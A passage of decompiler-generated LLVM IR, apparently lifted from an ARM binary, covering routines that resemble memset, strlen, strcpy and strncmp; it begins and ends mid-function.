  store i32 %v6_ec5050, i32* %r3.global-to-local, align 4
  %v0_ec5451 = load i32, i32* @r2, align 4
  %v1_ec5452 = add i32 %v0_ec5451, -8
  store i32 %v1_ec5452, i32* %r2.global-to-local, align 4
  %v5_ec5c53 = icmp slt i32 %v1_ec5452, 8
  br i1 %v5_ec5c53, label %dec_label_pc_ec50.dec_label_pc_ec88.loopexit_crit_edge, label %dec_label_pc_ec60

dec_label_pc_ec60:                                ; preds = %dec_label_pc_ec50.preheader, %dec_label_pc_ec48.dec_label_pc_ec50_crit_edge
  %v6_ec5055 = phi i32 [ %v6_ec50, %dec_label_pc_ec48.dec_label_pc_ec50_crit_edge ], [ %v6_ec5050, %dec_label_pc_ec50.preheader ]
  %v0_ec5054 = phi i32 [ %v12_ec7c, %dec_label_pc_ec48.dec_label_pc_ec50_crit_edge ], [ %v0_ec5028, %dec_label_pc_ec50.preheader ]
  %v1_ec60 = inttoptr i32 %v6_ec5055 to i32*
  %v2_ec60 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_ec60, i32* %v1_ec60, align 4
  %v3_ec60 = add i32 %v0_ec5054, 12
  %v4_ec60 = inttoptr i32 %v3_ec60 to i32*
  %v5_ec60 = load i32, i32* @ip, align 4
  store i32 %v5_ec60, i32* %v4_ec60, align 4
  %v6_ec60 = add i32 %v0_ec5054, 16
  store i32 %v6_ec60, i32* %r3.global-to-local, align 4
  %v0_ec64 = load i32, i32* %r2.global-to-local, align 4
  %v1_ec64 = add i32 %v0_ec64, -8
  store i32 %v1_ec64, i32* %r2.global-to-local, align 4
  %v5_ec6c = icmp slt i32 %v1_ec64, 8
  br i1 %v5_ec6c, label %dec_label_pc_ec60.dec_label_pc_ec88.loopexit_crit_edge, label %dec_label_pc_ec70

dec_label_pc_ec70:                                ; preds = %dec_label_pc_ec60
  %v1_ec70 = inttoptr i32 %v6_ec60 to i32*
  %v2_ec70 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_ec70, i32* %v1_ec70, align 4
  %v3_ec70 = add i32 %v0_ec5054, 20
  %v4_ec70 = inttoptr i32 %v3_ec70 to i32*
  %v5_ec70 = load i32, i32* @ip, align 4
  store i32 %v5_ec70, i32* %v4_ec70, align 4
  %v6_ec70 = add i32 %v0_ec5054, 24
  store i32 %v6_ec70, i32* %r3.global-to-local, align 4
  %v0_ec74 = load i32, i32* %r2.global-to-local, align 4
  %v1_ec74 = add i32 %v0_ec74, -8
  store i32 %v1_ec74, i32* %r2.global-to-local, align 4
  %v5_ec7c = icmp slt i32 %v1_ec74, 8
  br i1 %v5_ec7c, label %dec_label_pc_ec70.dec_label_pc_ec88.loopexit_crit_edge, label %dec_label_pc_ec48

dec_label_pc_ec48:                                ; preds = %dec_label_pc_ec70
  %v7_ec7c = inttoptr i32 %v6_ec70 to i32*
  %v8_ec7c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_ec7c, i32* %v7_ec7c, align 4
  %v9_ec7c = add i32 %v0_ec5054, 28
  %v10_ec7c = inttoptr i32 %v9_ec7c to i32*
  %v11_ec7c = load i32, i32* @ip, align 4
  store i32 %v11_ec7c, i32* %v10_ec7c, align 4
  %v12_ec7c = add i32 %v0_ec5054, 32
  store i32 %v12_ec7c, i32* %r3.global-to-local, align 4
  %v6_ec80 = load i32, i32* %r2.global-to-local, align 4
  %v7_ec80 = add i32 %v6_ec80, -8
  store i32 %v7_ec80, i32* %r2.global-to-local, align 4
  %v5_ec4c = icmp slt i32 %v7_ec80, 8
  br i1 %v5_ec4c, label %dec_label_pc_ec48.dec_label_pc_ec88.loopexit_crit_edge, label %dec_label_pc_ec48.dec_label_pc_ec50_crit_edge

dec_label_pc_ec48.dec_label_pc_ec50_crit_edge:    ; preds = %dec_label_pc_ec48
  %v2_ec50.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_ec50 = inttoptr i32 %v12_ec7c to i32*
  store i32 %v2_ec50.pre, i32* %v1_ec50, align 4
  %v3_ec50 = add i32 %v0_ec5054, 36
  %v4_ec50 = inttoptr i32 %v3_ec50 to i32*
  %v5_ec50 = load i32, i32* @ip, align 4
  store i32 %v5_ec50, i32* %v4_ec50, align 4
  %v6_ec50 = add i32 %v0_ec5054, 40
  store i32 %v6_ec50, i32* %r3.global-to-local, align 4
  %v0_ec54 = load i32, i32* %r2.global-to-local, align 4
  %v1_ec54 = add i32 %v0_ec54, -8
  store i32 %v1_ec54, i32* %r2.global-to-local, align 4
  %v5_ec5c = icmp slt i32 %v1_ec54, 8
  br i1 %v5_ec5c, label %dec_label_pc_ec50.dec_label_pc_ec88.loopexit_crit_edge, label %dec_label_pc_ec60

dec_label_pc_ec50.dec_label_pc_ec88.loopexit_crit_edge: ; preds = %dec_label_pc_ec48.dec_label_pc_ec50_crit_edge, %dec_label_pc_ec50.preheader
  %v1_ec54.lcssa = phi i32 [ %v1_ec5452, %dec_label_pc_ec50.preheader ], [ %v1_ec54, %dec_label_pc_ec48.dec_label_pc_ec50_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ec88

dec_label_pc_ec48.dec_label_pc_ec88.loopexit_crit_edge: ; preds = %dec_label_pc_ec48
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ec88

dec_label_pc_ec60.dec_label_pc_ec88.loopexit_crit_edge: ; preds = %dec_label_pc_ec60
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ec88

dec_label_pc_ec70.dec_label_pc_ec88.loopexit_crit_edge: ; preds = %dec_label_pc_ec70
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ec88

dec_label_pc_ec88:                                ; preds = %dec_label_pc_ec44, %dec_label_pc_ec50.dec_label_pc_ec88.loopexit_crit_edge, %dec_label_pc_ec48.dec_label_pc_ec88.loopexit_crit_edge, %dec_label_pc_ec60.dec_label_pc_ec88.loopexit_crit_edge, %dec_label_pc_ec70.dec_label_pc_ec88.loopexit_crit_edge, %dec_label_pc_ec20
  %v0_ec90 = phi i32 [ %v0_ec24, %dec_label_pc_ec20 ], [ %v1_ec74, %dec_label_pc_ec70.dec_label_pc_ec88.loopexit_crit_edge ], [ %v1_ec64, %dec_label_pc_ec60.dec_label_pc_ec88.loopexit_crit_edge ], [ %v7_ec80, %dec_label_pc_ec48.dec_label_pc_ec88.loopexit_crit_edge ], [ %v1_ec54.lcssa, %dec_label_pc_ec50.dec_label_pc_ec88.loopexit_crit_edge ], [ %v0_ec48.pr, %dec_label_pc_ec44 ]
  %v2_ec88 = icmp eq i32 %v0_ec90, 0
  store i1 %v2_ec88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ec88, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_ec88
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_ec88
  %v1_ec90 = sub i32 7, %v0_ec90
  store i32 %v1_ec90, i32* %r2.global-to-local, align 4
  %v3_ec94 = mul i32 %v1_ec90, 4
  %v4_ec94 = add i32 %v3_ec94, ptrtoint (i32* @global_var_ec9c.394 to i32)
  call void @__pseudo_branch(i32 %v4_ec94)
  %v0_ec9c = load i32, i32* %r1.global-to-local, align 4
  %v1_ec9c = trunc i32 %v0_ec9c to i8
  %v2_ec9c = load i32, i32* %r3.global-to-local, align 4
  %v3_ec9c = inttoptr i32 %v2_ec9c to i8*
  store i8 %v1_ec9c, i8* %v3_ec9c, align 1
  %v4_ec9c = load i32, i32* %r3.global-to-local, align 4
  %v5_ec9c = add i32 %v4_ec9c, 1
  store i32 %v5_ec9c, i32* %r3.global-to-local, align 4
  %v0_eca0 = load i32, i32* %r1.global-to-local, align 4
  %v1_eca0 = trunc i32 %v0_eca0 to i8
  %v3_eca0 = inttoptr i32 %v5_ec9c to i8*
  store i8 %v1_eca0, i8* %v3_eca0, align 1
  %v4_eca0 = load i32, i32* %r3.global-to-local, align 4
  %v5_eca0 = add i32 %v4_eca0, 1
  store i32 %v5_eca0, i32* %r3.global-to-local, align 4
  %v0_eca4 = load i32, i32* %r1.global-to-local, align 4
  %v1_eca4 = trunc i32 %v0_eca4 to i8
  %v3_eca4 = inttoptr i32 %v5_eca0 to i8*
  store i8 %v1_eca4, i8* %v3_eca4, align 1
  %v4_eca4 = load i32, i32* %r3.global-to-local, align 4
  %v5_eca4 = add i32 %v4_eca4, 1
  store i32 %v5_eca4, i32* %r3.global-to-local, align 4
  %v0_eca8 = load i32, i32* %r1.global-to-local, align 4
  %v1_eca8 = trunc i32 %v0_eca8 to i8
  %v3_eca8 = inttoptr i32 %v5_eca4 to i8*
  store i8 %v1_eca8, i8* %v3_eca8, align 1
  %v4_eca8 = load i32, i32* %r3.global-to-local, align 4
  %v5_eca8 = add i32 %v4_eca8, 1
  store i32 %v5_eca8, i32* %r3.global-to-local, align 4
  %v0_ecac = load i32, i32* %r1.global-to-local, align 4
  %v1_ecac = trunc i32 %v0_ecac to i8
  %v3_ecac = inttoptr i32 %v5_eca8 to i8*
  store i8 %v1_ecac, i8* %v3_ecac, align 1
  %v4_ecac = load i32, i32* %r3.global-to-local, align 4
  %v5_ecac = add i32 %v4_ecac, 1
  store i32 %v5_ecac, i32* %r3.global-to-local, align 4
  %v0_ecb0 = load i32, i32* %r1.global-to-local, align 4
  %v1_ecb0 = trunc i32 %v0_ecb0 to i8
  %v3_ecb0 = inttoptr i32 %v5_ecac to i8*
  store i8 %v1_ecb0, i8* %v3_ecb0, align 1
  %v4_ecb0 = load i32, i32* %r3.global-to-local, align 4
  %v5_ecb0 = add i32 %v4_ecb0, 1
  store i32 %v5_ecb0, i32* %r3.global-to-local, align 4
  %v0_ecb4 = load i32, i32* %r1.global-to-local, align 4
  %v1_ecb4 = trunc i32 %v0_ecb4 to i8
  %v3_ecb4 = inttoptr i32 %v5_ecb0 to i8*
  store i8 %v1_ecb4, i8* %v3_ecb4, align 1
  %v4_ecb4 = load i32, i32* %r3.global-to-local, align 4
  %v5_ecb4 = add i32 %v4_ecb4, 1
  store i32 %v5_ecb4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_ec50, { 1, 0 }
  uselistorder i32 %v12_ec7c, { 1, 2, 0 }
  uselistorder i32 %v0_ec5054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_ec48.pr, { 0, 2, 1 }
  uselistorder i32 %v6_ec38, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_ec2c, { 1, 0 }
  uselistorder i32 %v0_ec24, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 9, 8, 7, 10, 11, 12, 13, 6, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 4, 1, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_ec88, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_ec60, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @function_ecc0() local_unnamed_addr {
dec_label_pc_ecc0:
  %v0_ecc0 = load i32, i32* @r0, align 4
  %v1_ecc0 = and i32 %v0_ecc0, -4
  %v1_ecc4 = inttoptr i32 %v1_ecc0 to i32*
  %v2_ecc4 = load i32, i32* %v1_ecc4, align 4
  %v1_ecc8 = urem i32 %v0_ecc0, 4
  %v2_ecc8 = icmp eq i32 %v1_ecc8, 0
  %v1_eccc = sub nsw i32 0, %v1_ecc8
  br i1 %v2_ecc8, label %.preheader.preheader, label %dec_label_pc_ecd4

dec_label_pc_ecd4:                                ; preds = %dec_label_pc_ecc0
  %v1_ecd4 = or i32 %v2_ecc4, 255
  %v7_ecd8 = icmp eq i32 %v1_ecc8, 1
  br i1 %v7_ecd8, label %bb33, label %bb

bb:                                               ; preds = %dec_label_pc_ecd4
  %v9_ecdc = or i32 %v2_ecc4, 65535
  br label %bb33

bb33:                                             ; preds = %dec_label_pc_ecd4, %bb
  %v8_ece4 = phi i32 [ %v1_ecd4, %dec_label_pc_ecd4 ], [ %v9_ecdc, %bb ]
  %v7_ece4 = icmp eq i32 %v1_ecc8, 3
  br i1 %v7_ece4, label %bb34, label %.preheader.preheader

bb34:                                             ; preds = %bb33
  %v9_ece4 = or i32 %v8_ece4, 16711680
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %bb33, %bb34, %dec_label_pc_ecc0
  %v1_ecf4.ph = phi i32 [ %v2_ecc4, %dec_label_pc_ecc0 ], [ %v9_ece4, %bb34 ], [ %v8_ece4, %bb33 ]
  %v1_ece838 = urem i32 %v1_ecf4.ph, 256
  %v2_ece839 = icmp eq i32 %v1_ece838, 0
  %v2_ecec40 = and i32 %v1_ecf4.ph, 65280
  %v3_ecec41 = icmp eq i32 %v2_ecec40, 0
  %or.cond42 = or i1 %v2_ece839, %v3_ecec41
  %v2_ecf043 = and i32 %v1_ecf4.ph, 16711680
  %v3_ecf044 = icmp eq i32 %v2_ecf043, 0
  %or.cond3145 = or i1 %v3_ecf044, %or.cond42
  %v4_ecf446 = icmp ult i32 %v1_ecf4.ph, 16777216
  %or.cond3247 = or i1 %v4_ecf446, %or.cond3145
  br i1 %or.cond3247, label %dec_label_pc_ed04, label %.thread4

.thread4:                                         ; preds = %.preheader.preheader, %.thread4
  %v1_ecf81349 = phi i32 [ %v2_ecf814, %.thread4 ], [ %v1_eccc, %.preheader.preheader ]
  %v1_ecfc48.in = phi i32 [ %v1_ecfc48, %.thread4 ], [ %v1_ecc0, %.preheader.preheader ]
  %v1_ecfc48 = add i32 %v1_ecfc48.in, 4
  %v2_ecf814 = add i32 %v1_ecf81349, 4
  %v2_ecfc = inttoptr i32 %v1_ecfc48 to i32*
  %v3_ecfc = load i32, i32* %v2_ecfc, align 4
  %v1_ece8 = urem i32 %v3_ecfc, 256
  %v2_ece8 = icmp eq i32 %v1_ece8, 0
  %v2_ecec = and i32 %v3_ecfc, 65280
  %v3_ecec = icmp eq i32 %v2_ecec, 0
  %or.cond = or i1 %v2_ece8, %v3_ecec
  %v2_ecf0 = and i32 %v3_ecfc, 16711680
  %v3_ecf0 = icmp eq i32 %v2_ecf0, 0
  %or.cond31 = or i1 %v3_ecf0, %or.cond
  %v4_ecf4 = icmp ult i32 %v3_ecfc, 16777216
  %or.cond32 = or i1 %v4_ecf4, %or.cond31
  br i1 %or.cond32, label %dec_label_pc_ed04, label %.thread4

dec_label_pc_ed04:                                ; preds = %.thread4, %.preheader.preheader
  %v1_ecf813.lcssa = phi i32 [ %v1_eccc, %.preheader.preheader ], [ %v2_ecf814, %.thread4 ]
  %v2_ece8.lcssa = phi i1 [ %v2_ece839, %.preheader.preheader ], [ %v2_ece8, %.thread4 ]
  %v3_ecec.lcssa = phi i1 [ %v3_ecec41, %.preheader.preheader ], [ %v3_ecec, %.thread4 ]
  %v3_ecf0.lcssa = phi i1 [ %v3_ecf044, %.preheader.preheader ], [ %v3_ecf0, %.thread4 ]
  br i1 %v2_ece8.lcssa, label %.thread10, label %bb35

bb35:                                             ; preds = %dec_label_pc_ed04
  %v2_ed08 = add i32 %v1_ecf813.lcssa, 1
  br i1 %v3_ecec.lcssa, label %.thread10, label %bb36

bb36:                                             ; preds = %bb35
  %v2_ed1017 = add i32 %v1_ecf813.lcssa, 2
  br i1 %v3_ecf0.lcssa, label %.thread10, label %bb37

bb37:                                             ; preds = %bb36
  %v2_ed18 = add i32 %v1_ecf813.lcssa, 3
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_ed04, %bb35, %bb36, %bb37
  %v1_ed1c = phi i32 [ %v2_ed08, %bb35 ], [ %v2_ed1017, %bb36 ], [ %v2_ed18, %bb37 ], [ %v1_ecf813.lcssa, %dec_label_pc_ed04 ]
  ret i32 %v1_ed1c

; uselistorder directives
  uselistorder i32 %v1_ecf813.lcssa, { 1, 3, 2, 0 }
  uselistorder i32 %v3_ecfc, { 3, 2, 1, 0 }
  uselistorder i32 %v1_ecf4.ph, { 1, 2, 3, 0 }
  uselistorder i32 %v1_ecc8, { 3, 2, 1, 0 }
  uselistorder i32 16711680, { 1, 0, 2 }
  uselistorder label %.thread10, { 3, 2, 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0, 2 }
  uselistorder label %bb33, { 1, 0 }
}

define i32 @function_ed20(i32 %arg1, i8* %arg2) local_unnamed_addr {
dec_label_pc_ed20:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_ed20 = sub i32 %arg1, %tmp
  %v1_ed24 = add i32 %v2_ed20, -1
  store i32 %v1_ed24, i32* @r2, align 4
  %v2_ed284 = load i8, i8* %arg2, align 1
  %v5_ed286 = add i32 %tmp, 1
  store i32 %v5_ed286, i32* %r1.global-to-local, align 4
  %v2_ed2c7 = icmp eq i8 %v2_ed284, 0
  store i1 %v2_ed2c7, i1* %cpsr_z.global-to-local, align 1
  %v5_ed308 = inttoptr i32 %arg1 to i8*
  store i8 %v2_ed284, i8* %v5_ed308, align 1
  %v0_ed349 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ed349, label %dec_label_pc_ed38, label %dec_label_pc_ed28.dec_label_pc_ed28_crit_edge

dec_label_pc_ed28.dec_label_pc_ed28_crit_edge:    ; preds = %dec_label_pc_ed20, %dec_label_pc_ed28.dec_label_pc_ed28_crit_edge
  %v0_ed28.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_ed30.pre = load i32, i32* @r2, align 4
  %v1_ed28 = inttoptr i32 %v0_ed28.pre to i8*
  %v2_ed28 = load i8, i8* %v1_ed28, align 1
  %v5_ed28 = add i32 %v0_ed28.pre, 1
  store i32 %v5_ed28, i32* %r1.global-to-local, align 4
  %v2_ed2c = icmp eq i8 %v2_ed28, 0
  store i1 %v2_ed2c, i1* %cpsr_z.global-to-local, align 1
  %v4_ed30 = add i32 %v5_ed28, %v3_ed30.pre
  %v5_ed30 = inttoptr i32 %v4_ed30 to i8*
  store i8 %v2_ed28, i8* %v5_ed30, align 1
  %v0_ed34 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_ed34, label %dec_label_pc_ed38, label %dec_label_pc_ed28.dec_label_pc_ed28_crit_edge

dec_label_pc_ed38:                                ; preds = %dec_label_pc_ed28.dec_label_pc_ed28_crit_edge, %dec_label_pc_ed20
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ed28.dec_label_pc_ed28_crit_edge, { 1, 0 }
}

define i32 @function_ed3c(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_ed3c:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_ed3c = load i32, i32* %r2.global-to-local, align 4
  %v0_ed44 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ed44, i32* @lr, align 4
  %tmp143 = icmp ult i32 %v0_ed3c, 4
  br i1 %tmp143, label %.thread59, label %dec_label_pc_ed70

.thread59:                                        ; preds = %dec_label_pc_ed3c
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_ee4cthread-pre-split

dec_label_pc_ed58:                                ; preds = %thread-pre-split
  store i32 %v2_edac, i32* %r0.global-to-local, align 4
  ret i32 %v2_edac

dec_label_pc_ed60:                                ; preds = %bb74, %.thread6
  store i32 %v2_edd4, i32* %r0.global-to-local, align 4
  ret i32 %v2_edd4

dec_label_pc_ed68:                                ; preds = %bb77, %bb68, %.thread14, %.thread10, %.thread, %bb80
  %v1_ed68 = phi i32 [ 0, %.thread14 ], [ 0, %.thread10 ], [ 0, %.thread ], [ %v3_ee24, %bb80 ], [ %v4_edec, %bb77 ], [ %v3_ed74, %bb68 ]
  %v0_ed68 = phi i32 [ %v3_ee28, %.thread14 ], [ %v4_edf0, %.thread10 ], [ %v3_ed78, %.thread ], [ %v3_ee28, %bb80 ], [ %v4_edf0, %bb77 ], [ %v3_ed78, %bb68 ]
  %v2_ed68 = sub nsw i32 %v1_ed68, %v0_ed68
  store i32 %v2_ed68, i32* %r0.global-to-local, align 4
  ret i32 %v2_ed68

dec_label_pc_ed70:                                ; preds = %dec_label_pc_ed3c
  %v3_ed70 = udiv i32 %v0_ed3c, 4
  %v0_ed78.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_ed74

dec_label_pc_ed74:                                ; preds = %dec_label_pc_ee14, %dec_label_pc_ed70
  %v0_ee14 = phi i32 [ %v1_ee14, %dec_label_pc_ee14 ], [ %v3_ed70, %dec_label_pc_ed70 ]
  %v0_edbc = phi i32 [ %v1_edf8, %dec_label_pc_ee14 ], [ %v0_ed78.pre, %dec_label_pc_ed70 ]
  %v0_ed94 = phi i32 [ %v1_eda8, %dec_label_pc_ee14 ], [ %v0_ed44, %dec_label_pc_ed70 ]
  %v1_ed74 = inttoptr i32 %v0_ed94 to i8*
  %v2_ed74 = load i8, i8* %v1_ed74, align 1
  %v3_ed74 = zext i8 %v2_ed74 to i32
  store i32 %v3_ed74, i32* %r0.global-to-local, align 4
  %v1_ed78 = inttoptr i32 %v0_edbc to i8*
  %v2_ed78 = load i8, i8* %v1_ed78, align 1
  %v3_ed78 = zext i8 %v2_ed78 to i32
  %v2_ed7c = sub nsw i32 %v3_ed74, %v3_ed78
  %v9_ed7c = icmp eq i8 %v2_ed74, %v2_ed78
  br i1 %v9_ed7c, label %bb67, label %bb

bb:                                               ; preds = %dec_label_pc_ed74
  br label %bb67

bb67:                                             ; preds = %dec_label_pc_ed74, %bb
  %v1_ed88 = phi i32 [ %v2_ed7c, %dec_label_pc_ed74 ], [ 1, %bb ]
  %v2_ed84 = icmp eq i8 %v2_ed74, 0
  br i1 %v2_ed84, label %.thread, label %bb68

.thread:                                          ; preds = %bb67
  br label %dec_label_pc_ed68

bb68:                                             ; preds = %bb67
  %v2_ed8c = icmp eq i32 %v1_ed88, 0
  br i1 %v2_ed8c, label %dec_label_pc_ed94, label %dec_label_pc_ed68

dec_label_pc_ed94:                                ; preds = %bb68
  %v1_ed94 = add i32 %v0_ed94, 1
  %v2_ed98 = inttoptr i32 %v1_ed94 to i8*
  %v3_ed98 = load i8, i8* %v2_ed98, align 1
  %v4_ed98 = zext i8 %v3_ed98 to i32
  store i32 %v4_ed98, i32* %r0.global-to-local, align 4
  %v1_ed9c = add i32 %v0_edbc, 1
  %v2_ed9c = inttoptr i32 %v1_ed9c to i8*
  %v3_ed9c = load i8, i8* %v2_ed9c, align 1
  %v4_ed9c = zext i8 %v3_ed9c to i32
  %v1_eda0 = add i32 %v0_ed94, 2
  %v1_eda8 = add i32 %v0_ed94, 4
  store i32 %v1_eda8, i32* @lr, align 4
  %v2_edac = sub nsw i32 %v4_ed98, %v4_ed9c
  %v9_edac = icmp eq i8 %v3_ed98, %v3_ed9c
  br i1 %v9_edac, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_ed94
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_ed94, %bb69
  %v1_edb8 = phi i32 [ %v2_edac, %dec_label_pc_ed94 ], [ 1, %bb69 ]
  %v2_edb4 = icmp eq i8 %v3_ed98, 0
  br i1 %v2_edb4, label %bb71, label %thread-pre-split

bb71:                                             ; preds = %bb70
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb70, %bb71
  %v0_edc0 = phi i32 [ 1, %bb71 ], [ %v1_edb8, %bb70 ]
  %v2_edc0 = icmp eq i32 %v0_edc0, 0
  br i1 %v2_edc0, label %dec_label_pc_edcc, label %dec_label_pc_ed58

dec_label_pc_edcc:                                ; preds = %thread-pre-split
  %v1_edc4 = add i32 %v0_edbc, 2
  %v2_edcc = inttoptr i32 %v1_eda0 to i8*
  %v3_edcc = load i8, i8* %v2_edcc, align 1
  %v4_edcc = zext i8 %v3_edcc to i32
  store i32 %v4_edcc, i32* %r0.global-to-local, align 4
  %v2_edd0 = inttoptr i32 %v1_edc4 to i8*
  %v3_edd0 = load i8, i8* %v2_edd0, align 1
  %v4_edd0 = zext i8 %v3_edd0 to i32
  %v2_edd4 = sub nsw i32 %v4_edcc, %v4_edd0
  %v9_edd4 = icmp eq i8 %v3_edcc, %v3_edd0
  br i1 %v9_edd4, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_edcc
  br label %bb73

bb73:                                             ; preds = %dec_label_pc_edcc, %bb72
  %v1_ede0 = phi i32 [ %v2_edd4, %dec_label_pc_edcc ], [ 1, %bb72 ]
  %v2_eddc = icmp eq i8 %v3_edcc, 0
  br i1 %v2_eddc, label %.thread6, label %bb74

.thread6:                                         ; preds = %bb73
  br label %dec_label_pc_ed60

bb74:                                             ; preds = %bb73
  %v2_ede4 = icmp eq i32 %v1_ede0, 0
  br i1 %v2_ede4, label %dec_label_pc_edec, label %dec_label_pc_ed60

dec_label_pc_edec:                                ; preds = %bb74
  %v1_edec = add i32 %v0_ed94, 3
  %v2_edec = inttoptr i32 %v1_edec to i8*
  %v3_edec = load i8, i8* %v2_edec, align 1
  %v4_edec = zext i8 %v3_edec to i32
  store i32 %v4_edec, i32* %r0.global-to-local, align 4
  %v1_edf0 = add i32 %v0_edbc, 3
  %v2_edf0 = inttoptr i32 %v1_edf0 to i8*
  %v3_edf0 = load i8, i8* %v2_edf0, align 1
  %v4_edf0 = zext i8 %v3_edf0 to i32
  %v1_edf8 = add i32 %v0_edbc, 4
  store i32 %v1_edf8, i32* @r1, align 4
  %v2_edfc = sub nsw i32 %v4_edec, %v4_edf0
  %v9_edfc = icmp eq i8 %v3_edec, %v3_edf0
  br i1 %v9_edfc, label %bb76, label %bb75

bb75:                                             ; preds = %dec_label_pc_edec
  br label %bb76

bb76:                                             ; preds = %dec_label_pc_edec, %bb75
  %v1_ee08 = phi i32 [ %v2_edfc, %dec_label_pc_edec ], [ 1, %bb75 ]
  %v2_ee04 = icmp eq i8 %v3_edec, 0
  br i1 %v2_ee04, label %.thread10, label %bb77

.thread10:                                        ; preds = %bb76
  br label %dec_label_pc_ed68

bb77:                                             ; preds = %bb76
  %v2_ee0c = icmp eq i32 %v1_ee08, 0
  br i1 %v2_ee0c, label %dec_label_pc_ee14, label %dec_label_pc_ed68

dec_label_pc_ee14:                                ; preds = %bb77
  %v1_ee14 = add i32 %v0_ee14, -1
  %v7_ee14 = icmp eq i32 %v0_ee14, 1
  br i1 %v7_ee14, label %dec_label_pc_ee1c, label %dec_label_pc_ed74

dec_label_pc_ee1c:                                ; preds = %dec_label_pc_ee14
  %v1_ee1c = urem i32 %v0_ed3c, 4
  store i32 %v1_ee1c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_ee4c

dec_label_pc_ee24:                                ; preds = %dec_label_pc_ee4c
  %v1_ee24 = inttoptr i32 %v0_ee44 to i8*
  %v2_ee24 = load i8, i8* %v1_ee24, align 1
  %v3_ee24 = zext i8 %v2_ee24 to i32
  store i32 %v3_ee24, i32* %r0.global-to-local, align 4
  %v0_ee28 = load i32, i32* @r1, align 4
  %v1_ee28 = inttoptr i32 %v0_ee28 to i8*
  %v2_ee28 = load i8, i8* %v1_ee28, align 1
  %v3_ee28 = zext i8 %v2_ee28 to i32
  %v2_ee2c = sub nsw i32 %v3_ee24, %v3_ee28
  %v9_ee2c = icmp eq i8 %v2_ee24, %v2_ee28
  br i1 %v9_ee2c, label %bb79, label %bb78

bb78:                                             ; preds = %dec_label_pc_ee24
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_ee24, %bb78
  %v1_ee38 = phi i32 [ %v2_ee2c, %dec_label_pc_ee24 ], [ 1, %bb78 ]
  %v2_ee34 = icmp eq i8 %v2_ee24, 0
  br i1 %v2_ee34, label %.thread14, label %bb80

.thread14:                                        ; preds = %bb79
  br label %dec_label_pc_ed68

bb80:                                             ; preds = %bb79
  %v2_ee3c = icmp eq i32 %v1_ee38, 0
  br i1 %v2_ee3c, label %dec_label_pc_ee44, label %dec_label_pc_ed68

dec_label_pc_ee44:                                ; preds = %bb80
  %v1_ee44 = add i32 %v0_ee44, 1
  store i32 %v1_ee44, i32* @lr, align 4
  %v1_ee48 = add i32 %v0_ee28, 1
  store i32 %v1_ee48, i32* @r1, align 4
  br label %dec_label_pc_ee4cthread-pre-split

dec_label_pc_ee4cthread-pre-split:                ; preds = %.thread59, %dec_label_pc_ee44
  %v0_ee58142 = phi i32 [ %v3_ee28, %dec_label_pc_ee44 ], [ 0, %.thread59 ]
  %v1_ee5854 = phi i32 [ %v3_ee24, %dec_label_pc_ee44 ], [ 0, %.thread59 ]
  %v0_ee2447 = phi i32 [ %v1_ee44, %dec_label_pc_ee44 ], [ %v0_ed44, %.thread59 ]
  %v0_ee4c.pr = phi i32 [ %v1_ee50, %dec_label_pc_ee44 ], [ %v0_ed3c, %.thread59 ]
  br label %dec_label_pc_ee4c

